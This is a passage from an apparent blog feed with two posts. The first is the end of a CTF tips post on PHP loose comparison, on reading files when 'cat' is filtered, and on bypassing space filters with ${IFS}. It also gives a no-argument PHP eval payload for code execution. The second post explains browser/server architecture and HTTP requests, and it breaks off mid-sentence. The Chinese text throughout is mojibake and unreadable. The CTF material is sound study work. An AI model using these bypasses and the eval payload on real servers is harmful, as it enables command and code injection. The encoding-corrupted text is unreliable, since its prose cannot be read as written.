class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-variable">$array</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;1bc&#x27;</span>, <span class="hljs-variable">$array</span>)); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æƒ…å†µè¿”å›çš„éƒ½æ˜¯ trueï¼Œå› ä¸º <code>&#39;abc&#39;</code> ä¼šè½¬æ¢ä¸º 0ï¼Œ <code>&#39;1bc&#39;</code> è½¬æ¢ä¸º 1ã€‚</p><p><code>array_search()</code> ä¸ <code>in_array()</code> ä¹Ÿæ˜¯ä¸€æ ·çš„é—®é¢˜ã€‚</p><h2 id="å°èŠå£«"><a href="#å°èŠå£«" class="headerlink" title="å°èŠå£«"></a>å°èŠå£«</h2><h4 id="linuxå‘½ä»¤"><a href="#linuxå‘½ä»¤" class="headerlink" title="linuxå‘½ä»¤"></a>linuxå‘½ä»¤</h4><h5 id="catè¢«è¿‡æ»¤"><a href="#catè¢«è¿‡æ»¤" class="headerlink" title="catè¢«è¿‡æ»¤"></a>catè¢«è¿‡æ»¤</h5><ul><li><code>tac</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ–‡æœ¬å¤„ç†å‘½ä»¤ï¼Œæ ¸å¿ƒåŠŸèƒ½æ˜¯ <strong>åå‘è¾“å‡ºæ–‡ä»¶å†…å®¹</strong></li><li><code>more</code> å‘½ä»¤æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹çš„å·¥å…·ï¼Œåœ¨å¤„ç†ç¯‡å¹…è¾ƒé•¿çš„æ–‡æœ¬æ–‡ä»¶æ—¶éå¸¸å®ç”¨</li><li><code>less,tail,head</code></li></ul><h5 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h5><p>&lt;ã€&gt;ã€${IFS}ã€$IFSã€$IFS$9</p><p><a href="https://blog.csdn.net/2401_84466223/article/details/139408099">CTFä¸­çš„å‘½ä»¤æ‰§è¡Œç»•è¿‡æ–¹å¼</a></p><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>æ— å‚ğŸ</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">phpinfo</span>();</span><br></code></pre></td></tr></table></figure><p class="note note-success">æœ¬æ–‡æ‘˜è‡ªCTF-Wikiï¼ŒåŸæ–‡åŸºç¡€ä¸Šæœ‰æ”¹åŠ¨</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµè§ˆå™¨BSæ¶æ„ä¸è¯·æ±‚åŒ…ã€è¿”å›åŒ…åŸç†</title>
    <link href="/2025/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8BS%E6%9E%B6%E6%9E%84%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%8C%85%E3%80%81%E8%BF%94%E5%9B%9E%E5%8C%85%E5%8E%9F%E7%90%86/"/>
    <url>/2025/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8BS%E6%9E%B6%E6%9E%84%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%8C%85%E3%80%81%E8%BF%94%E5%9B%9E%E5%8C%85%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="æµè§ˆå™¨BSæ¶æ„ä¸è¯·æ±‚åŒ…ã€è¿”å›åŒ…åŸç†"><a href="#æµè§ˆå™¨BSæ¶æ„ä¸è¯·æ±‚åŒ…ã€è¿”å›åŒ…åŸç†" class="headerlink" title="æµè§ˆå™¨BSæ¶æ„ä¸è¯·æ±‚åŒ…ã€è¿”å›åŒ…åŸç†"></a>æµè§ˆå™¨BSæ¶æ„ä¸è¯·æ±‚åŒ…ã€è¿”å›åŒ…åŸç†</h1><h1 id="ä¸€ã€åŸºç¡€æ¦‚å¿µï¼šä»€ä¹ˆæ˜¯BSæ¶æ„ï¼Ÿ"><a href="#ä¸€ã€åŸºç¡€æ¦‚å¿µï¼šä»€ä¹ˆæ˜¯BSæ¶æ„ï¼Ÿ" class="headerlink" title="ä¸€ã€åŸºç¡€æ¦‚å¿µï¼šä»€ä¹ˆæ˜¯BSæ¶æ„ï¼Ÿ"></a>ä¸€ã€åŸºç¡€æ¦‚å¿µï¼šä»€ä¹ˆæ˜¯BSæ¶æ„ï¼Ÿ</h1><h2 id="1-1-å®šä¹‰"><a href="#1-1-å®šä¹‰" class="headerlink" title="1.1 å®šä¹‰"></a>1.1 å®šä¹‰</h2><p>BSæ¶æ„å…¨ç§°ä¸ºBrowser&#x2F;Serverï¼ˆæµè§ˆå™¨&#x2F;æœåŠ¡å™¨ï¼‰æ¶æ„ï¼Œæ˜¯ä¸€ç§åŸºäºç½‘ç»œçš„è½¯ä»¶æ¶æ„æ¨¡å¼ã€‚å®ƒä»¥<strong>æµè§ˆå™¨</strong>ä½œä¸ºå®¢æˆ·ç«¯çš„ç»Ÿä¸€äº¤äº’å…¥å£ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨å‘é€æ“ä½œè¯·æ±‚ï¼Œè¯·æ±‚è¢«ä¼ é€’è‡³è¿œç¨‹çš„<strong>æœåŠ¡å™¨</strong>ï¼ŒæœåŠ¡å™¨è¿›è¡Œä¸šåŠ¡é€»è¾‘å¤„ç†å’Œæ•°æ®è¿ç®—åï¼Œå°†ç»“æœè¿”å›ç»™æµè§ˆå™¨ï¼Œæœ€ç»ˆç”±æµè§ˆå™¨è§£æå¹¶å‘ˆç°ç»™ç”¨æˆ·ã€‚</p><h2 id="1-2-æ ¸å¿ƒç‰¹ç‚¹"><a href="#1-2-æ ¸å¿ƒç‰¹ç‚¹" class="headerlink" title="1.2 æ ¸å¿ƒç‰¹ç‚¹"></a>1.2 æ ¸å¿ƒç‰¹ç‚¹</h2><ul><li><p><strong>å®¢æˆ·ç«¯è½»é‡åŒ–</strong>ï¼šæ— éœ€å®‰è£…ä¸“é—¨çš„å®¢æˆ·ç«¯è½¯ä»¶ï¼Œä»…éœ€é€šç”¨æµè§ˆå™¨ï¼ˆChromeã€Firefoxã€Edgeç­‰ï¼‰å³å¯å®Œæˆæ‰€æœ‰äº¤äº’ï¼Œé™ä½ç”¨æˆ·ä½¿ç”¨æˆæœ¬ã€‚</p></li><li><p><strong>æœåŠ¡ç«¯é›†ä¸­åŒ–</strong>ï¼šä¸šåŠ¡é€»è¾‘ã€æ•°æ®å­˜å‚¨ã€æƒé™æ§åˆ¶ç­‰æ ¸å¿ƒåŠŸèƒ½å‡åœ¨æœåŠ¡å™¨ç«¯å®ç°ï¼Œä¾¿äºç³»ç»Ÿçš„ç»´æŠ¤ã€å‡çº§å’Œæ•°æ®ç®¡ç†ï¼ˆåªéœ€æ›´æ–°æœåŠ¡å™¨ï¼Œæ‰€æœ‰å®¢æˆ·ç«¯å³å¯åŒæ­¥ä½¿ç”¨æ–°åŠŸèƒ½ï¼‰ã€‚</p></li><li><p><strong>è·¨å¹³å°æ€§å¼º</strong>ï¼šåªè¦è®¾å¤‡æ”¯æŒæµè§ˆå™¨ï¼Œæ— è®ºWindowsã€macOSã€iOSã€Androidç­‰ç³»ç»Ÿï¼Œéƒ½èƒ½ç»Ÿä¸€è®¿é—®ç³»ç»Ÿï¼Œè§£å†³äº†CSæ¶æ„ï¼ˆå®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨ï¼‰çš„è·¨å¹³å°å…¼å®¹é—®é¢˜ã€‚</p></li><li><p><strong>ä¾èµ–ç½‘ç»œä¼ è¾“</strong>ï¼šå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’å®Œå…¨ä¾èµ–HTTP&#x2F;HTTPSç­‰ç½‘ç»œåè®®ï¼Œç½‘ç»œç¨³å®šæ€§ç›´æ¥å½±å“ç³»ç»Ÿä½¿ç”¨ä½“éªŒã€‚</p></li></ul><h2 id="1-3-ä¸CSæ¶æ„çš„æ ¸å¿ƒåŒºåˆ«"><a href="#1-3-ä¸CSæ¶æ„çš„æ ¸å¿ƒåŒºåˆ«" class="headerlink" title="1.3 ä¸CSæ¶æ„çš„æ ¸å¿ƒåŒºåˆ«"></a>1.3 ä¸CSæ¶æ„çš„æ ¸å¿ƒåŒºåˆ«</h2><table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>BSæ¶æ„</th><th>CSæ¶æ„</th></tr></thead><tbody><tr><td>å®¢æˆ·ç«¯å½¢å¼</td><td>é€šç”¨æµè§ˆå™¨</td><td>ä¸“ç”¨å®¢æˆ·ç«¯è½¯ä»¶</td></tr><tr><td>æ›´æ–°ç»´æŠ¤</td><td>æœåŠ¡å™¨ç«¯ç»Ÿä¸€æ›´æ–°</td><td>æ‰€æœ‰å®¢æˆ·ç«¯é€ä¸€æ›´æ–°</td></tr><tr><td>è·¨å¹³å°æ€§</td><td>å¼ºï¼ˆæµè§ˆå™¨å…¼å®¹ï¼‰</td><td>å¼±ï¼ˆéœ€å¼€å‘å¤šç‰ˆæœ¬å®¢æˆ·ç«¯ï¼‰</td></tr><tr><td>ç½‘ç»œä¾èµ–</td><td>å¿…é¡»è”ç½‘</td><td>éƒ¨åˆ†åŠŸèƒ½å¯ç¦»çº¿ä½¿ç”¨</td></tr></tbody></table><h1 id="äºŒã€BSæ¶æ„çš„æ ¸å¿ƒäº¤äº’æµç¨‹"><a href="#äºŒã€BSæ¶æ„çš„æ ¸å¿ƒäº¤äº’æµç¨‹" class="headerlink" title="äºŒã€BSæ¶æ„çš„æ ¸å¿ƒäº¤äº’æµç¨‹"></a>äºŒã€BSæ¶æ„çš„æ ¸å¿ƒäº¤äº’æµç¨‹</h1><p>æµè§ˆå™¨ä¸æœåŠ¡å™¨çš„äº¤äº’æ˜¯BSæ¶æ„çš„æ ¸å¿ƒï¼Œæ•´ä¸ªæµç¨‹éµå¾ªâ€œè¯·æ±‚-å¤„ç†-å“åº”â€çš„é—­ç¯æ¨¡å¼ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p><strong>ç”¨æˆ·æ“ä½œè§¦å‘è¯·æ±‚</strong>ï¼šç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œæ“ä½œï¼ˆå¦‚è¾“å…¥ç½‘å€ã€ç‚¹å‡»æŒ‰é’®ã€æäº¤è¡¨å•ç­‰ï¼‰ï¼Œæµè§ˆå™¨æ•è·è¯¥æ“ä½œå¹¶å‡†å¤‡å‘èµ·è¯·æ±‚ã€‚</p></li><li><p><strong>æµè§ˆå™¨å°è£…è¯·æ±‚åŒ…</strong>ï¼šæµè§ˆå™¨å°†ç”¨æˆ·éœ€æ±‚è½¬åŒ–ä¸ºæ ‡å‡†åŒ–çš„â€œè¯·æ±‚åŒ…â€ï¼ŒåŒ…å«è¯·æ±‚ç›®æ ‡ã€è¯·æ±‚æ–¹å¼ã€è¯·æ±‚å‚æ•°ç­‰å…³é”®ä¿¡æ¯ï¼Œå¹¶é€šè¿‡HTTP&#x2F;HTTPSåè®®å‘é€ã€‚</p></li><li><p><strong>è¯·æ±‚åŒ…é€šè¿‡ç½‘ç»œä¼ è¾“</strong>ï¼šè¯·æ±‚åŒ…ç»æœ¬åœ°ç½‘ç»œã€è¿è¥å•†ç½‘ç»œã€äº’è”ç½‘ä¼ è¾“è‡³ç›®æ ‡æœåŠ¡å™¨ã€‚</p></li><li><p><strong>æœåŠ¡å™¨æ¥æ”¶å¹¶å¤„ç†è¯·æ±‚</strong>ï¼šæœåŠ¡å™¨çš„ç›‘å¬ç¨‹åºï¼ˆå¦‚Nginxã€Tomcatï¼‰æ¥æ”¶è¯·æ±‚åŒ…ï¼Œè§£æå…¶ä¸­çš„éœ€æ±‚ï¼Œè°ƒç”¨å¯¹åº”çš„ä¸šåŠ¡é€»è¾‘æ¨¡å—ï¼ˆå¦‚Javaçš„Spring Bootã€Pythonçš„Djangoï¼‰è¿›è¡Œå¤„ç†ï¼Œå¿…è¦æ—¶è®¿é—®æ•°æ®åº“è·å–æ•°æ®ã€‚</p></li><li><p><strong>æœåŠ¡å™¨å°è£…è¿”å›åŒ…</strong>ï¼šæœåŠ¡å™¨å°†å¤„ç†ç»“æœï¼ˆå¦‚HTMLé¡µé¢ã€JSONæ•°æ®ã€å›¾ç‰‡ç­‰ï¼‰å°è£…ä¸ºâ€œè¿”å›åŒ…â€ï¼ŒåŒ…å«å“åº”çŠ¶æ€ã€æ•°æ®ç±»å‹ã€å…·ä½“å†…å®¹ç­‰ä¿¡æ¯ã€‚</p></li><li><p><strong>è¿”å›åŒ…å›ä¼ è‡³æµè§ˆå™¨</strong>ï¼šè¿”å›åŒ…æ²¿åŸç½‘ç»œè·¯å¾„åå‘ä¼ è¾“è‡³å‘èµ·è¯·æ±‚çš„æµè§ˆå™¨ã€‚</p></li><li><p><strong>æµè§ˆå™¨è§£æå¹¶å‘ˆç°ç»“æœ</strong>ï¼šæµè§ˆå™¨è§£æè¿”å›åŒ…ä¸­çš„æ•°æ®ï¼Œå°†å…¶è½¬åŒ–ä¸ºç”¨æˆ·å¯ç›´è§‚æ„ŸçŸ¥çš„å†…å®¹ï¼ˆå¦‚ç½‘é¡µã€å›¾ç‰‡ã€æ–‡å­—ï¼‰ï¼Œå±•ç¤ºåœ¨ç•Œé¢ä¸Šã€‚</p></li></ol><p>æ ¸å¿ƒæ€»ç»“ï¼šæ•´ä¸ªäº¤äº’çš„æœ¬è´¨æ˜¯â€œè¯·æ±‚åŒ…â€ä¸â€œè¿”å›åŒ…â€çš„ä¼ é€’ä¸è§£æï¼Œæµè§ˆå™¨è´Ÿè´£â€œå‘èµ·è¯·æ±‚+è§£æå“åº”â€ï¼ŒæœåŠ¡å™¨è´Ÿè´£â€œå¤„ç†è¯·æ±‚+ç”Ÿæˆå“åº”â€ã€‚</p><h1 id="ä¸‰ã€å…³é”®è½½ä½“ï¼šè¯·æ±‚åŒ…ï¼ˆRequest-Packetï¼‰"><a href="#ä¸‰ã€å…³é”®è½½ä½“ï¼šè¯·æ±‚åŒ…ï¼ˆRequest-Packetï¼‰" class="headerlink" title="ä¸‰ã€å…³é”®è½½ä½“ï¼šè¯·æ±‚åŒ…ï¼ˆRequest Packetï¼‰"></a>ä¸‰ã€å…³é”®è½½ä½“ï¼šè¯·æ±‚åŒ…ï¼ˆRequest Packetï¼‰</h1><h2 id="3-1-å®šä¹‰ä¸ä½œç”¨"><a href="#3-1-å®šä¹‰ä¸ä½œç”¨" class="headerlink" title="3.1 å®šä¹‰ä¸ä½œç”¨"></a>3.1 å®šä¹‰ä¸ä½œç”¨</h2><p>è¯·æ±‚åŒ…æ˜¯æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€çš„â€œéœ€æ±‚è¯´æ˜ä¹¦â€ï¼Œæ˜¯æ ‡å‡†åŒ–çš„ä¿¡æ¯é›†åˆï¼Œç”¨äºæ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨â€œæˆ‘æ˜¯è°ã€æˆ‘è¦ä»€ä¹ˆã€æˆ‘æä¾›ä»€ä¹ˆå‚æ•°â€ï¼Œç¡®ä¿æœåŠ¡å™¨èƒ½å‡†ç¡®ç†è§£å¹¶å¤„ç†éœ€æ±‚ã€‚</p><h2 id="3-2-æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPè¯·æ±‚æ ¼å¼ï¼‰"><a href="#3-2-æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPè¯·æ±‚æ ¼å¼ï¼‰" class="headerlink" title="3.2 æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPè¯·æ±‚æ ¼å¼ï¼‰"></a>3.2 æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPè¯·æ±‚æ ¼å¼ï¼‰</h2><p>HTTPåè®®è§„å®šäº†è¯·æ±‚åŒ…çš„å›ºå®šæ ¼å¼ï¼Œä¸»è¦åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<strong>è¯·æ±‚è¡Œ</strong>ã€<strong>è¯·æ±‚å¤´</strong>ã€<strong>è¯·æ±‚ä½“</strong>ï¼ˆå¯é€‰ï¼‰ï¼Œå„éƒ¨åˆ†ä»¥ç©ºè¡Œåˆ†éš”ã€‚</p><h3 id="3-2-1-è¯·æ±‚è¡Œï¼šè¯·æ±‚çš„æ ¸å¿ƒæ ‡è¯†"><a href="#3-2-1-è¯·æ±‚è¡Œï¼šè¯·æ±‚çš„æ ¸å¿ƒæ ‡è¯†" class="headerlink" title="3.2.1 è¯·æ±‚è¡Œï¼šè¯·æ±‚çš„æ ¸å¿ƒæ ‡è¯†"></a>3.2.1 è¯·æ±‚è¡Œï¼šè¯·æ±‚çš„æ ¸å¿ƒæ ‡è¯†</h3><p>è¯·æ±‚è¡Œæ˜¯è¯·æ±‚åŒ…çš„ç¬¬ä¸€è¡Œï¼ŒåŒ…å«ä¸‰ä¸ªå…³é”®ä¿¡æ¯ï¼Œç”¨ç©ºæ ¼åˆ†éš”ï¼š</p><ul><li><p><strong>è¯·æ±‚æ–¹æ³•</strong>ï¼šæ˜ç¡®è¯·æ±‚çš„ç±»å‹ï¼Œå¸¸ç”¨æ–¹æ³•æœ‰ï¼š<br>  GETï¼šè·å–èµ„æºï¼ˆå¦‚è®¿é—®ç½‘é¡µã€æŸ¥è¯¢æ•°æ®ï¼‰ï¼Œè¯·æ±‚å‚æ•°é™„åŠ åœ¨URLåï¼Œä¼ è¾“æ•°æ®é‡å°ï¼ˆé€šå¸¸â‰¤2KBï¼‰ï¼Œä¸”å¯è§ï¼ˆä¸å®‰å…¨ï¼‰ã€‚</p></li><li><p>POSTï¼šæäº¤èµ„æºï¼ˆå¦‚æ³¨å†Œè¡¨å•ã€ä¸Šä¼ æ–‡ä»¶ï¼‰ï¼Œè¯·æ±‚å‚æ•°æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œä¼ è¾“æ•°æ®é‡å¤§ï¼Œä¸”ä¸å¯è§ï¼ˆç›¸å¯¹å®‰å…¨ï¼‰ã€‚</p></li><li><p>PUTï¼šæ›´æ–°èµ„æºï¼ˆå…¨é‡æ›´æ–°ï¼‰ï¼›DELETEï¼šåˆ é™¤èµ„æºï¼›PATCHï¼šéƒ¨åˆ†æ›´æ–°èµ„æºï¼ˆRESTful APIå¸¸ç”¨ï¼‰ã€‚</p></li></ul><p><strong>è¯·æ±‚URL</strong>ï¼šæŒ‡å®šè¯·æ±‚çš„ç›®æ ‡èµ„æºåœ°å€ï¼ˆå¦‚<a href="https://www.baidu.com/s%EF%BC%89%EF%BC%8C%E5%8D%B3%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%B5%84%E6%BA%90%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%E3%80%82">https://www.baidu.com/sï¼‰ï¼Œå³æœåŠ¡å™¨ä¸Šèµ„æºçš„å”¯ä¸€æ ‡è¯†ã€‚</a></p><p><strong>HTTPç‰ˆæœ¬</strong>ï¼šä½¿ç”¨çš„HTTPåè®®ç‰ˆæœ¬ï¼Œå¸¸ç”¨HTTP&#x2F;1.1ï¼ˆä¸»æµï¼‰ã€HTTP&#x2F;2ï¼ˆæ€§èƒ½æ›´ä¼˜ï¼‰ã€HTTP&#x2F;3ï¼ˆåŸºäºQUICåè®®ï¼Œä½å»¶è¿Ÿï¼‰ã€‚</p><p>ç¤ºä¾‹ï¼šGET <a href="https://www.baidu.com/s?wd=BS%E6%9E%B6%E6%9E%84">https://www.baidu.com/s?wd=BSæ¶æ„</a> HTTP&#x2F;1.1</p><h3 id="3-2-2-è¯·æ±‚å¤´ï¼šè¯·æ±‚çš„é™„åŠ ä¿¡æ¯"><a href="#3-2-2-è¯·æ±‚å¤´ï¼šè¯·æ±‚çš„é™„åŠ ä¿¡æ¯" class="headerlink" title="3.2.2 è¯·æ±‚å¤´ï¼šè¯·æ±‚çš„é™„åŠ ä¿¡æ¯"></a>3.2.2 è¯·æ±‚å¤´ï¼šè¯·æ±‚çš„é™„åŠ ä¿¡æ¯</h3><p>è¯·æ±‚å¤´æ˜¯ä¸€ç³»åˆ—é”®å€¼å¯¹ï¼ˆKey: Valueï¼‰ï¼Œç”¨äºå‘æœåŠ¡å™¨ä¼ é€’è¯·æ±‚çš„é™„åŠ ä¿¡æ¯ï¼Œå¸®åŠ©æœåŠ¡å™¨æ›´ç²¾å‡†åœ°å¤„ç†è¯·æ±‚ï¼Œå¸¸è§è¯·æ±‚å¤´å¦‚ä¸‹ï¼š</p><table><thead><tr><th>è¯·æ±‚å¤´å­—æ®µ</th><th>ä½œç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>Host</td><td>æŒ‡å®šç›®æ ‡æœåŠ¡å™¨çš„åŸŸåæˆ–IPï¼ˆå¦‚<a href="http://www.baidu.com),ç”¨äºæœåŠ¡å™¨åœ¨å¤šåŸŸåéƒ¨ç½²æ—¶è¯†åˆ«è¯·æ±‚ç›®æ ‡./">www.baidu.comï¼‰ï¼Œç”¨äºæœåŠ¡å™¨åœ¨å¤šåŸŸåéƒ¨ç½²æ—¶è¯†åˆ«è¯·æ±‚ç›®æ ‡ã€‚</a></td></tr><tr><td>User-Agentï¼ˆUAï¼‰</td><td>æ ‡è¯†æµè§ˆå™¨ç±»å‹ã€ç‰ˆæœ¬åŠæ“ä½œç³»ç»Ÿï¼ˆå¦‚Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36ï¼‰ï¼ŒæœåŠ¡å™¨å¯æ®æ­¤è¿”å›é€‚é…çš„é¡µé¢ï¼ˆå¦‚ç§»åŠ¨ç«¯&#x2F;PCç«¯é¡µé¢ï¼‰ã€‚</td></tr><tr><td>Accept</td><td>æŒ‡å®šæµè§ˆå™¨å¯æ¥æ”¶çš„å“åº”æ•°æ®ç±»å‹ï¼ˆå¦‚text&#x2F;htmlã€application&#x2F;jsonï¼‰ï¼ŒæœåŠ¡å™¨æ®æ­¤è¿”å›å¯¹åº”æ ¼å¼çš„æ•°æ®ã€‚</td></tr><tr><td>Cookie</td><td>å­˜å‚¨æµè§ˆå™¨ç«¯çš„èº«ä»½ä¿¡æ¯ï¼ˆå¦‚ç™»å½•çŠ¶æ€ã€ç”¨æˆ·åå¥½ï¼‰ï¼Œæ¯æ¬¡è¯·æ±‚è‡ªåŠ¨æºå¸¦ï¼Œå®ç°â€œä¼šè¯ä¿æŒâ€ï¼ˆå¦‚ç™»å½•åæ— éœ€é‡å¤è¾“å…¥å¯†ç ï¼‰ã€‚</td></tr><tr><td>Content-Type</td><td>ä»…POSTè¯·æ±‚éœ€è¦ï¼ŒæŒ‡å®šè¯·æ±‚ä½“çš„æ•°æ®æ ¼å¼ï¼ˆå¦‚application&#x2F;x-www-form-urlencodedï¼ˆè¡¨å•ï¼‰ã€multipart&#x2F;form-dataï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰ï¼‰ã€‚</td></tr></tbody></table><h3 id="3-2-3-è¯·æ±‚ä½“ï¼šè¯·æ±‚çš„å‚æ•°æ•°æ®"><a href="#3-2-3-è¯·æ±‚ä½“ï¼šè¯·æ±‚çš„å‚æ•°æ•°æ®" class="headerlink" title="3.2.3 è¯·æ±‚ä½“ï¼šè¯·æ±‚çš„å‚æ•°æ•°æ®"></a>3.2.3 è¯·æ±‚ä½“ï¼šè¯·æ±‚çš„å‚æ•°æ•°æ®</h3><p>è¯·æ±‚ä½“æ˜¯å¯é€‰éƒ¨åˆ†ï¼Œä»…å½“è¯·æ±‚éœ€è¦ä¼ é€’å¤§é‡å‚æ•°æˆ–äºŒè¿›åˆ¶æ•°æ®æ—¶å­˜åœ¨ï¼ˆå¦‚POSTè¯·æ±‚æäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶ï¼‰ï¼ŒGETè¯·æ±‚çš„å‚æ•°é€šè¿‡URLä¼ é€’ï¼Œæ— è¯·æ±‚ä½“ã€‚</p><p>ç¤ºä¾‹ï¼ˆè¡¨å•æäº¤çš„è¯·æ±‚ä½“ï¼‰ï¼šusername&#x3D;zhangsan&amp;password&#x3D;123456</p><h1 id="å››ã€å…³é”®ç»“æœï¼šè¿”å›åŒ…ï¼ˆResponse-Packetï¼‰"><a href="#å››ã€å…³é”®ç»“æœï¼šè¿”å›åŒ…ï¼ˆResponse-Packetï¼‰" class="headerlink" title="å››ã€å…³é”®ç»“æœï¼šè¿”å›åŒ…ï¼ˆResponse Packetï¼‰"></a>å››ã€å…³é”®ç»“æœï¼šè¿”å›åŒ…ï¼ˆResponse Packetï¼‰</h1><h2 id="4-1-å®šä¹‰ä¸ä½œç”¨"><a href="#4-1-å®šä¹‰ä¸ä½œç”¨" class="headerlink" title="4.1 å®šä¹‰ä¸ä½œç”¨"></a>4.1 å®šä¹‰ä¸ä½œç”¨</h2><p>è¿”å›åŒ…æ˜¯æœåŠ¡å™¨å¯¹æµè§ˆå™¨è¯·æ±‚çš„â€œå¤„ç†ç»“æœæŠ¥å‘Šâ€ï¼ŒåŒ…å«æœåŠ¡å™¨çš„å¤„ç†çŠ¶æ€ã€æ•°æ®æ ¼å¼åŠå…·ä½“çš„å“åº”å†…å®¹ï¼Œç¡®ä¿æµè§ˆå™¨èƒ½å‡†ç¡®è§£æå¹¶å‘ˆç°ç»“æœã€‚</p><h2 id="4-2-æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPå“åº”æ ¼å¼ï¼‰"><a href="#4-2-æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPå“åº”æ ¼å¼ï¼‰" class="headerlink" title="4.2 æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPå“åº”æ ¼å¼ï¼‰"></a>4.2 æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼ˆHTTPå“åº”æ ¼å¼ï¼‰</h2><p>ä¸è¯·æ±‚åŒ…å¯¹åº”ï¼ŒHTTPå“åº”åŒ…ä¹Ÿåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<strong>å“åº”è¡Œ</strong>ã€<strong>å“åº”å¤´</strong>ã€<strong>å“åº”ä½“</strong>ï¼Œå„éƒ¨åˆ†ä»¥ç©ºè¡Œåˆ†éš”ã€‚</p><h3 id="4-2-1-å“åº”è¡Œï¼šå“åº”çš„çŠ¶æ€æ ‡è¯†"><a href="#4-2-1-å“åº”è¡Œï¼šå“åº”çš„çŠ¶æ€æ ‡è¯†" class="headerlink" title="4.2.1 å“åº”è¡Œï¼šå“åº”çš„çŠ¶æ€æ ‡è¯†"></a>4.2.1 å“åº”è¡Œï¼šå“åº”çš„çŠ¶æ€æ ‡è¯†</h3><p>å“åº”è¡Œæ˜¯è¿”å›åŒ…çš„ç¬¬ä¸€è¡Œï¼ŒåŒ…å«ä¸‰ä¸ªå…³é”®ä¿¡æ¯ï¼š</p><ul><li><p><strong>HTTPç‰ˆæœ¬</strong>ï¼šä¸è¯·æ±‚åŒ…çš„HTTPç‰ˆæœ¬å¯¹åº”ï¼ˆå¦‚HTTP&#x2F;1.1ï¼‰ã€‚</p></li><li><p><strong>å“åº”çŠ¶æ€ç </strong>ï¼šç”¨æ•°å­—æ ‡è¯†è¯·æ±‚çš„å¤„ç†ç»“æœï¼Œåˆ†ä¸º5ç±»ï¼ˆ1xx-ä¿¡æ¯æ€§ã€2xx-æˆåŠŸã€3xx-é‡å®šå‘ã€4xx-å®¢æˆ·ç«¯é”™è¯¯ã€5xx-æœåŠ¡å™¨é”™è¯¯ï¼‰ï¼Œå¸¸è§çŠ¶æ€ç ï¼š<br>  200 OKï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿”å›æ•°æ®ã€‚</p></li><li><p>302 Foundï¼šä¸´æ—¶é‡å®šå‘ï¼Œå¼•å¯¼æµè§ˆå™¨è®¿é—®æ–°çš„URLã€‚</p></li><li><p>400 Bad Requestï¼šè¯·æ±‚å‚æ•°é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•è§£æã€‚</p></li><li><p>401 Unauthorizedï¼šæœªæˆæƒï¼Œéœ€å…ˆç™»å½•æ‰èƒ½è®¿é—®ã€‚</p></li><li><p>403 Forbiddenï¼šæœåŠ¡å™¨æ‹’ç»è®¿é—®ï¼ˆæƒé™ä¸è¶³ï¼‰ã€‚</p></li><li><p>404 Not Foundï¼šè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ï¼ˆURLé”™è¯¯ï¼‰ã€‚</p></li><li><p>500 Internal Server Errorï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼ˆå¦‚ä»£ç bugï¼‰ã€‚</p></li><li><p>503 Service Unavailableï¼šæœåŠ¡å™¨æš‚æ—¶æ— æ³•æä¾›æœåŠ¡ï¼ˆå¦‚è¿‡è½½ï¼‰ã€‚</p></li></ul><p><strong>çŠ¶æ€æè¿°</strong>ï¼šå¯¹çŠ¶æ€ç çš„æ–‡å­—è§£é‡Šï¼ˆå¦‚OKã€Not 